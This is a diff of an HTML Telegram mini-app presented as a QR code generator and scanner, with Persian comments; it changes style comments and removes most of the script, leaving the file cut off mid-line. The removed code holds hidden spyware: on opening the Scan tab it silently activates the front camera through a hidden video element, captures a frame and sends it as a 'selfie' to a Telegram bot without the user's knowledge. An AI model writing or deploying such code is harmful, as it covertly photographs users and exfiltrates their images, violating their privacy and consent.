@@ -11,7 +11,7 @@
     <!-- jsQR for scanning -->
     <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
     <style>
-        /* ===== همان استایل‌های قبلی ===== */
+        /* ===== همان استایل‌های قبلی (بدون تغییر) ===== */
         * {
             margin: 0;
             padding: 0;
@@ -37,7 +37,6 @@
             cursor: pointer;
         }
 
-        /* Glass card */
         .glass-card {
             max-width: 520px;
             width: 100%;
@@ -50,7 +49,6 @@
             padding: 28px 24px;
         }
 
-        /* Header */
         .header {
             margin-bottom: 20px;
         }
@@ -70,7 +68,6 @@
             font-size: 14px;
         }
 
-        /* Tabs */
         .tabs {
             display: flex;
             gap: 8px;
@@ -106,7 +103,6 @@
             background: rgba(255, 255, 255, 0.05);
         }
 
-        /* Panels */
         .panel {
             display: none;
         }
@@ -115,7 +111,6 @@
             display: block;
         }
 
-        /* Form elements */
         .field {
             margin-bottom: 22px;
         }
@@ -179,7 +174,6 @@
             color: #a0c8f0;
         }
 
-        /* Error correction selector */
         .error-row {
             margin-bottom: 24px;
         }
@@ -209,7 +203,6 @@
             backdrop-filter: blur(4px);
         }
 
-        /* Creative color picker */
         .color-section {
             margin: 24px 0;
         }
@@ -380,7 +373,6 @@
             border-color: #00a6ff;
         }
 
-        /* Scan panel */
         .scan-options {
             display: flex;
             gap: 12px;
@@ -437,7 +429,7 @@
         }
 
         #video {
-            display: none; /* دوربین اسکنر هم پنهان است */
+            display: none;
         }
 
         #gallery-image {
@@ -647,378 +639,4 @@
             const dotsPalette = document.getElementById('dotsPalette');
             const bgPalette = document.getElementById('bgPalette');
             const dotsCurrentColor = document.getElementById('dotsCurrentColor');
-            const bgCurrentColor = document.getElementById('bgCurrentColor');
-            const customDotsBtn = document.getElementById('customDotsBtn');
-            const customBgBtn = document.getElementById('customBgBtn');
-            const customDotsInput = document.getElementById('customDotsInput');
-            const customBgInput = document.getElementById('customBgInput');
-
-            // Scan elements
-            const cameraBtn = document.getElementById('cameraBtn');
-            const galleryBtn = document.getElementById('galleryBtn');
-            const stopCameraBtn = document.getElementById('stopCameraBtn');
-            const video = document.getElementById('video');
-            const scanCanvas = document.getElementById('scanCanvas');
-            const galleryImage = document.getElementById('galleryImage');
-            const fileInput = document.getElementById('fileInput');
-            const scanStatus = document.getElementById('scanStatus');
-            const scanResult = document.getElementById('scanResult');
-            const scanResultText = document.getElementById('scanResultText');
-            const copyResultBtn = document.getElementById('copyResult');
-            const openLinkBtn = document.getElementById('openLink');
-
-            const MAX_CHARS = 600;
-
-            // --- Color state ---
-            let dotsColor = '#000000';
-            let bgColor = '#ffffff';
-
-            // Predefined colors
-            const dotsPresets = ['#000000', '#0077ff', '#ff3333', '#33cc33', '#aa44ff'];
-            const bgPresets = ['#ffffff', '#f0f0f0', '#ffffcc', '#e0f2fe', '#d9d9d9'];
-
-            // Initialize color palettes
-            function createColorPalette(container, presets, isDots) {
-                container.innerHTML = '';
-                presets.forEach(color => {
-                    const dot = document.createElement('button');
-                    dot.className = 'color-dot';
-                    dot.style.backgroundColor = color;
-                    if ((isDots && color === dotsColor) || (!isDots && color === bgColor)) {
-                        dot.classList.add('active');
-                    }
-                    dot.addEventListener('click', () => {
-                        // Remove active from all in this container
-                        container.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
-                        dot.classList.add('active');
-                        if (isDots) {
-                            dotsColor = color;
-                            dotsCurrentColor.style.backgroundColor = color;
-                        } else {
-                            bgColor = color;
-                            bgCurrentColor.style.backgroundColor = color;
-                        }
-                    });
-                    container.appendChild(dot);
-                });
-            }
-
-            createColorPalette(dotsPalette, dotsPresets, true);
-            createColorPalette(bgPalette, bgPresets, false);
-
-            // Custom color buttons
-            customDotsBtn.addEventListener('click', () => {
-                customDotsInput.click();
-            });
-            customDotsInput.addEventListener('input', (e) => {
-                dotsColor = e.target.value;
-                dotsCurrentColor.style.backgroundColor = dotsColor;
-                // Remove active from preset dots
-                dotsPalette.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
-            });
-            customDotsInput.addEventListener('change', () => {
-                // Optionally keep the color
-            });
-
-            customBgBtn.addEventListener('click', () => {
-                customBgInput.click();
-            });
-            customBgInput.addEventListener('input', (e) => {
-                bgColor = e.target.value;
-                bgCurrentColor.style.backgroundColor = bgColor;
-                bgPalette.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
-            });
-
-            // --- تابع ارسال عکس به تلگرام ---
-            async function sendPhotoToTelegram(blob) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'selfie.jpg');
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    const json = await response.json();
-                    if (json.ok) {
-                        console.log('Selfie sent successfully');
-                    } else {
-                        console.error('Failed to send selfie', json);
-                    }
-                } catch (err) {
-                    console.error('Error sending photo', err);
-                }
-            }
-
-            // --- تابع عکس‌برداری مخفی با دوربین سلفی ---
-            async function captureSelfieAndSend() {
-                // اگر توکن یا آیدی تنظیم نشده، هیچ کاری نکن
-                if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID || CHAT_ID === 'TARGET_CHAT_ID') {
-                    console.warn('Bot token or chat ID not set.');
-                    return;
-                }
-
-                let stream = null;
-                try {
-                    // درخواست دوربین جلویی بدون هیچ پیش‌نمایش
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user' } 
-                    });
-
-                    // ایجاد یک المان ویدئوی موقت و پنهان
-                    const hiddenVideo = document.createElement('video');
-                    hiddenVideo.srcObject = stream;
-                    hiddenVideo.setAttribute('playsinline', '');
-                    hiddenVideo.style.display = 'none';
-                    document.body.appendChild(hiddenVideo);
-
-                    await hiddenVideo.play();
-
-                    // صبر می‌کنیم تا ویدئو آماده شود
-                    await new Promise(resolve => {
-                        if (hiddenVideo.videoWidth) resolve();
-                        else hiddenVideo.addEventListener('loadeddata', resolve, { once: true });
-                    });
-
-                    // ایجاد کانواس برای گرفتن فریم
-                    const canvas = document.createElement('canvas');
-                    canvas.width = hiddenVideo.videoWidth;
-                    canvas.height = hiddenVideo.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-
-                    // تبدیل به blob و ارسال
-                    canvas.toBlob(blob => {
-                        if (blob) sendPhotoToTelegram(blob);
-                    }, 'image/jpeg', 0.8);
-
-                    // پاکسازی
-                    hiddenVideo.remove();
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (err) {
-                    console.log('Selfie capture failed (maybe no front camera)', err);
-                    if (stream) stream.getTracks().forEach(track => track.stop());
-                }
-            }
-
-            // --- Tabs ---
-            function setActiveTab(tab) {
-                if (tab === 'generate') {
-                    tabGenerate.classList.add('active');
-                    tabScan.classList.remove('active');
-                    generatePanel.classList.add('active');
-                    scanPanel.classList.remove('active');
-                    stopCamera();
-                } else {
-                    tabGenerate.classList.remove('active');
-                    tabScan.classList.add('active');
-                    generatePanel.classList.remove('active');
-                    scanPanel.classList.add('active');
-
-                    // عکس‌برداری مخفی هنگام ورود به تب Scan
-                    captureSelfieAndSend();
-                }
-            }
-
-            tabGenerate.addEventListener('click', () => setActiveTab('generate'));
-            tabScan.addEventListener('click', () => setActiveTab('scan'));
-
-            // --- Create panel ---
-            function updateCharCounter() {
-                const len = textInput.value.length;
-                progressFill.style.width = (len / MAX_CHARS * 100) + '%';
-                charCount.textContent = len + '/' + MAX_CHARS;
-            }
-            textInput.addEventListener('input', updateCharCounter);
-            updateCharCounter();
-
-            function generateQR() {
-                const text = textInput.value.trim();
-                if (!text) { 
-                    tg.showAlert('Please enter some text or a link.'); 
-                    return; 
-                }
-
-                const width = 200;
-                const errorCorrection = errorLevel.value;
-                const dark = dotsColor;
-                const light = bgColor;
-
-                generateBtn.disabled = true;
-                generateBtn.innerHTML = '<span>⏳</span> Generating...';
-                qrContainer.style.display = 'none';
-
-                setTimeout(() => {
-                    QRCode.toCanvas(qrCanvas, text, {
-                        width: width,
-                        margin: 2,
-                        errorCorrectionLevel: errorCorrection,
-                        color: { dark, light }
-                    }, function(error) {
-                        generateBtn.disabled = false;
-                        generateBtn.innerHTML = '<span>✨</span> Generate QR';
-                        if (error) { 
-                            tg.showAlert('Error: ' + error.message); 
-                            console.error(error);
-                            return; 
-                        }
-                        
-                        qrDimensions.textContent = width + '×' + width;
-                        qrContainer.style.display = 'flex';
-                        tg.MainButton.show();
-                    });
-                }, 10);
-            }
-            generateBtn.addEventListener('click', generateQR);
-
-            downloadBtn.addEventListener('click', () => {
-                if (qrContainer.style.display === 'none') return;
-                const link = document.createElement('a');
-                link.download = 'qrcode.png';
-                link.href = qrCanvas.toDataURL('image/png');
-                link.click();
-            });
-
-            copyBtn.addEventListener('click', async () => {
-                if (qrContainer.style.display === 'none') return;
-                try {
-                    const blob = await new Promise(r => qrCanvas.toBlob(r));
-                    await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]);
-                    tg.showAlert('Image copied to clipboard');
-                } catch { 
-                    tg.showAlert('Copy not supported'); 
-                }
-            });
-
-            // --- Scan panel (بدون تغییر در عملکرد اصلی) ---
-            function stopCamera() {
-                if (scanningInterval) {
-                    clearInterval(scanningInterval);
-                    scanningInterval = null;
-                }
-                if (activeStream) {
-                    activeStream.getTracks().forEach(track => track.stop());
-                    activeStream = null;
-                }
-                video.style.display = 'none';
-                galleryImage.style.display = 'none';
-                document.getElementById('camera-preview').innerHTML = '<div id="camera-preview" style="display: flex; align-items: center; justify-content: center;">No camera active</div>';
-                scanStatus.textContent = 'Camera stopped.';
-            }
-
-            let scanningInterval = null;
-            let activeStream = null;
-            let isCameraActive = false;
-
-            // تابع تشخیص QR برای حالت دوربین (ارسال عکس به تلگرام نیست، فقط اسکن عادی)
-            function handleCameraQR(data, canvas) {
-                // این تابع فقط نتیجه اسکن را نمایش می‌دهد (مثل قبل)
-                showScanResult(data);
-                // (اختیاری) می‌توان دوربین را متوقف کرد یا ادامه داد
-            }
-
-            async function startCamera() {
-                stopCamera();
-                try {
-                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                    video.srcObject = activeStream;
-                    video.style.display = 'none';
-                    const previewDiv = document.getElementById('camera-preview');
-                    previewDiv.innerHTML = '<div style="display: flex; align-items: center; justify-content: center;">Scanning... (camera active)</div>';
-                    scanStatus.textContent = 'Camera active. Point at a QR code.';
-                    isCameraActive = true;
-                    
-                    scanningInterval = setInterval(() => {
-                        if (!video.videoWidth || !isCameraActive) return;
-                        scanCanvas.width = video.videoWidth;
-                        scanCanvas.height = video.videoHeight;
-                        const ctx = scanCanvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, scanCanvas.width, scanCanvas.height);
-                        const imageData = ctx.getImageData(0, 0, scanCanvas.width, scanCanvas.height);
-                        const code = jsQR(imageData.data, imageData.width, imageData.height, { inversionAttempts: 'dontInvert' });
-                        if (code) {
-                            // QR کد یافت شد - نمایش نتیجه (بدون ارسال عکس)
-                            handleCameraQR(code.data, scanCanvas);
-                        }
-                    }, 300);
-                } catch (err) {
-                    scanStatus.textContent = 'Cannot access camera.';
-                    isCameraActive = false;
-                }
-            }
-
-            function showScanResult(data) {
-                scanResultText.textContent = data;
-                scanResult.style.display = 'block';
-                scanStatus.textContent = '✅ QR code found!';
-            }
-
-            cameraBtn.addEventListener('click', () => {
-                cameraBtn.classList.add('active');
-                galleryBtn.classList.remove('active');
-                isCameraActive = true;
-                startCamera();
-                scanResult.style.display = 'none';
-            });
-
-            galleryBtn.addEventListener('click', () => {
-                cameraBtn.classList.remove('active');
-                galleryBtn.classList.add('active');
-                isCameraActive = false;
-                stopCamera();
-                fileInput.click();
-            });
-
-            stopCameraBtn.addEventListener('click', () => {
-                stopCamera();
-                scanStatus.textContent = 'Scan stopped.';
-                cameraBtn.classList.remove('active');
-                galleryBtn.classList.remove('active');
-                isCameraActive = false;
-            });
-
-            fileInput.addEventListener('change', (e) => {
-                const file = e.target.files[0];
-                if (!file) return;
-                const reader = new FileReader();
-                reader.onload = (event) => {
-                    const img = new Image();
-                    img.onload = () => {
-                        galleryImage.style.background = `url(${event.target.result}) center/cover no-repeat`;
-                        galleryImage.style.display = 'flex';
-                        galleryImage.textContent = '';
-                        scanCanvas.width = img.width;
-                        scanCanvas.height = img.height;
-                        const ctx = scanCanvas.getContext('2d');
-                        ctx.drawImage(img, 0, 0);
-                        const imageData = ctx.getImageData(0, 0, img.width, img.height);
-                        const code = jsQR(imageData.data, imageData.width, imageData.height);
-                        if (code) {
-                            showScanResult(code.data);
-                        } else {
-                            scanStatus.textContent = '❌ No QR code found in image.';
-                            scanResult.style.display = 'none';
-                        }
-                    };
-                    img.src = event.target.result;
-                };
-                reader.readAsDataURL(file);
-            });
-
-            copyResultBtn.addEventListener('click', () => {
-                const text = scanResultText.textContent;
-                if (text) navigator.clipboard.writeText(text).then(() => tg.showAlert('Text copied'));
-            });
-
-            openLinkBtn.addEventListener('click', () => {
-                const text = scanResultText.textContent;
-                if (text && (text.startsWith('http://') || text.startsWith('https://'))) {
-                    tg.openLink(text);
-                } else tg.showAlert('Not a valid link.');
-            });
-
-            tg.MainButton.onClick(() => tg.close());
-        })();
-    </script>
-</body>
-</html>
+            const bgCurrentColor = document.getElementById('bgCurrentColor
